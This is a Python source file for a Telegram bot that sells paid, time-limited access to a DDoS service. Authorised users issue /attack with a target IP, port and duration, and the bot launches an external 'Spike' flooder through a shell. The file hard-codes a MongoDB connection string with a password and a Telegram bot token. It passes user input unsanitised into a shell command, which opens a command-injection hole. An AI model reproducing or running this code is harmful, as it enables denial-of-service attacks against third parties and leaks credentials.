import os
import asyncio
import random
import string
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

os.system('chmod +x *')

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def log_message_periodically():
    def periodic_logging():
        while True:
            logging.info("Virtual Venture OP DDOS")
            time.sleep(300)  # 5 minutes in seconds
    thread = threading.Thread(target=periodic_logging, daemon=True)
    thread.start()


# Database Configuration
MONGO_URI = 'mongodb+srv://harry:Sachdeva@cluster1.b02ct.mongodb.net/?retryWrites=true&w=majority&appName=Cluster1'
client = MongoClient(MONGO_URI)
db = client['Harvinder']
users_collection = db['newuser']
settings_collection = db['settings-git']  # A new collection to store global settings
redeem_codes_collection = db['redeem_code-git']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7542906508:AAGY0M6HoSRqz-g1FStvxe5aLa7wTaIXkdw'
ADMIN_USER_ID = 5134043595  # Replace with your admin user ID
COOLDOWN_PERIOD = timedelta(minutes=1)  # Cooldown period of 1 minute
user_last_attack_time = {}  # Dictionary to store last attack time for users

# Default values (in case not set by the admin)
DEFAULT_BYTE_SIZE = 5
DEFAULT_THREADS = 2

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    # Check if the user is an admin
    if user_id != ADMIN_USER_ID:
        # Help text for regular users
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "* /start* - Start interacting with the bot.\n"
            "* /attack* - Trigger an attack operation.\n"
            "* /redeem* - Redeem a code.\n"
        )
    else:
        # Help text for admins
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "* /start* - Start interacting with the bot.\n"
            "* /add* - Add a user to the system.\n"
            "* /remove* - Remove a user from the system.\n"
            "* /thread* - Set a thread for communication.\n"
            "* /byte* - Set a byte value.\n"
            "* /show* - Show current settings.\n"
            "* /users* - List all users in the system.\n"
            "* /attack* - Trigger an attack operation.\n"
            "* /gen* - Generate a redeem code.\n"
            "* /redeem* - Redeem a code.\n"
            "* /cleanup* - Remove expired users from the system.\n"
        )

    # Send the help message to the user
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]  # The second argument is the time input (e.g., '2m', '5d')

    # Extract numeric value and unit from the input
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 86400  # Convert days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 60  # Convert minutes to seconds
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)  # Updated to use timezone-aware UTC

    # Add or update user in the database
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    
    # Remove user from the database
    users_collection.delete_one({"user_id": target_user_id})

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def set_thread(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the number of threads!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /thread <number of threads>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        if threads <= 0:
            raise ValueError("Number of threads must be positive.")

        # Save the number of threads to the database
        settings_collection.update_one(
            {"setting": "threads"},
            {"$set": {"value": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Number of threads set to {threads}.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

async def set_byte(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the byte size!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /byte <byte size>*", parse_mode='Markdown')
        return

    try:
        byte_size = int(context.args[0])
        if byte_size <= 0:
            raise ValueError("Byte size must be positive.")

        # Save the byte size to the database
        settings_collection.update_one(
            {"setting": "byte_size"},
            {"$set": {"value": byte_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Byte size set to {byte_size}.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

async def show_settings(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view the settings!*", parse_mode='Markdown')
        return

    # Retrieve byte size and thread count from the database
    byte_size = settings_collection.find_one({"setting": "byte_size"})
    threads = settings_collection.find_one({"setting": "threads"})

    byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
    threads = threads["value"] if threads else DEFAULT_THREADS

    message = (
        f"*🔢 Current Settings:*\n"
        f"*⚡ Byte Size: {byte_size}*\n"
        f"*💻 Threads: {threads}*"
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def list_users(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view the users!*", parse_mode='Markdown')
        return

    # Retrieve all users from the database
    users = users_collection.find()
    
    if not users:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No users found.*", parse_mode='Markdown')
        return

    message = "*👥 User List:*\n\n"
    for user in users:
        expiry_date = user['expiry_date'].strftime('%Y-%m-%d %H:%M:%S') if user.get('expiry_date') else "No expiry"
        message += f"*User ID: {user['user_id']} - Expiry: {expiry_date}*\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            # Ensure expiry_date is timezone-aware
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            # Compare with the current time
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    # Check for cooldown
    current_time = datetime.now(timezone.utc)
    last_attack_time = user_last_attack_time.get(user_id)

    if last_attack_time:
        elapsed_time = current_time - last_attack_time
        if elapsed_time < COOLDOWN_PERIOD:
            remaining_time = COOLDOWN_PERIOD - elapsed_time
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
                parse_mode='Markdown'
            )
            return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Retrieve byte size and thread count from the database
    byte_size = settings_collection.find_one({"setting": "byte_size"})
    threads = settings_collection.find_one({"setting": "threads"})

    byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
    threads = threads["value"] if threads else DEFAULT_THREADS

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔢 Threads: {threads}*\n"
        f"*⚡ Byte Size: {byte_size}*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, byte_size, threads, context))

    # Update the last attack time for the user
    user_last_attack_time[user_id] = current_time

async def run_attack(chat_id, ip, port, duration, byte_size, threads, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} {byte_size} {threads}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

        # Function to generate redeem code
async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to generate redeem codes!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /gen <days/minutes>*", parse_mode='Markdown')
        return

    time_input = context.args[0]
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 86400  # Days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 60  # Minutes to seconds
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)
    redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

    # Insert redeem code into MongoDB
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date
    })

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Redeem code generated: {redeem_code}*\n*Expires in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

# Function to redeem a code
async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return

    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness

    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return

    # Update the user's expiry date
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

# Function to check if a user is allowed
async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def cleanup(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to perform this action!*", parse_mode='Markdown')
        return

    # Get the current UTC time
    current_time = datetime.now(timezone.utc)

    # Find users with expired expiry_date
    expired_users = users_collection.find({"expiry_date": {"$lt": current_time}})

    expired_users_list = list(expired_users)  # Convert cursor to list

    if len(expired_users_list) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No expired users found.*", parse_mode='Markdown')
        return

    # Remove expired users from the database
    for user in expired_users_list:
        users_collection.delete_one({"_id": user["_id"]})

    # Notify admin
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Cleanup Complete!*\n*Removed {len(expired_users_list)} expired users.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cleanup", cleanup))

    # Run the bot
    application.run_polling()
    logger.info("Bot is running.")

if __name__ == '__main__':
    main()
